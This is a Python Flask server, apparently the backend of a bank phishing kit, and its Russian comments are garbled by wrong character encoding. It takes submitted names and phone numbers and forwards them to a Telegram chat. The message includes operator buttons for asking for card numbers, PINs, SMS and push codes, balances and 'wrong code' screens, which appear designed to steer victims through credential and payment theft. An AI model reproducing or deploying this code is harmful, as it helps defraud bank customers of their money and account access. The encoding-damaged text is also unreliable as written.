import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# ‚úÖ –°–æ–∑–¥–∞—ë–º Flask-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
app = Flask(__name__)
CORS(app)

# ‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ WebSocket (–ò—Å–ø–æ–ª—å–∑—É–µ–º `async_mode="threading"`)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ‚úÖ –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    raise ValueError("‚ùå –û—à–∏–±–∫–∞: TELEGRAM_BOT_TOKEN –∏–ª–∏ CHAT_ID –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")

print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω CHAT_ID: {CHAT_ID}")

# ‚úÖ –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ (–¢–µ–ø–µ—Ä—å `/` –Ω–µ –æ—Ç–¥–∞—ë—Ç 404)
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "OK", "message": "–°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç!"}), 200

# ‚úÖ –û–±—Ä–∞–±–æ—Ç—á–∏–∫ WebSocket-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
@socketio.on("connect")
def handle_connect():
    print("‚úÖ WebSocket –ø–æ–¥–∫–ª—é—á–µ–Ω!")

@socketio.on("disconnect")
def handle_disconnect():
    print("‚ùå WebSocket –æ—Ç–∫–ª—é—á–µ–Ω!")

# ‚úÖ –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫ WebSocket
@socketio.on_error()
def handle_socket_error(e):
    print(f"‚ö† –û—à–∏–±–∫–∞ WebSocket: {e}")

# ‚úÖ –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram
def send_telegram_message(data):
    try:
        message_text = f"üì© –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å:\n\n–ò–º—è: {data.get('name')}\n–¢–µ–ª–µ—Ñ–æ–Ω: {data.get('phone')}\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: {data.get('comment')}"
        keyboard = {
            "inline_keyboard": [
                [{"text": "SMS", "callback_data": "redirect_sms"},
                 {"text": "–ü—É—à", "callback_data": "push"},
                 {"text": "–í–≤–æ–¥ –∫–∞—Ä—Ç—ã", "callback_data": "card"},
                 {"text": "PIN", "callback_data": "pin"}],
                [{"text": "–õ–∏–º–∏—Ç—ã", "callback_data": "limits"},
                 {"text": "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥", "callback_data": "wrong_code"},
                 {"text": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", "callback_data": "phone_number"}],
                [{"text": "–°–≤–æ–π —Ç–µ–∫—Å—Ç/—Ñ–æ—Ç–æ", "callback_data": "custom_text"}],
                [{"text": "–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ", "callback_data": "topup"},
                 {"text": "–ë–∞–ª–∞–Ω—Å", "callback_data": "balance"}],
                [{"text": "‚úÖ –£—Å–ø–µ—Ö", "callback_data": "success"},
                 {"text": "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –õ–ö", "callback_data": "wrong_lk"}]
            ]
        }

        payload = {
            "chat_id": CHAT_ID,
            "text": message_text,
            "reply_markup": keyboard
        }

        print(f"üì© –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram: {payload}")  # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π

        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –∑–∞–ø—Ä–æ—Å–∞
        )

        response_data = response.json()
        print(f"üì© –û—Ç–≤–µ—Ç Telegram: {response_data}")

        return response_data
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
        return {"ok": False, "error": str(e)}

# ‚úÖ –û–±—Ä–∞–±–æ—Ç—á–∏–∫ POST-–∑–∞–ø—Ä–æ—Å–∞
@app.route("/send-to-telegram", methods=["POST"])
def send_to_telegram():
    try:
        data = request.json
        print(f"üì© –ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ: {data}")

        if not data or "name" not in data or "phone" not in data:
            return jsonify({"error": "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–∞–Ω–Ω—ã—Ö"}), 400

        # ‚úÖ –í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
        response = send_telegram_message(data)

        return jsonify(response)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {e}")
        return jsonify({"error": str(e)}), 500

# ‚úÖ –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)


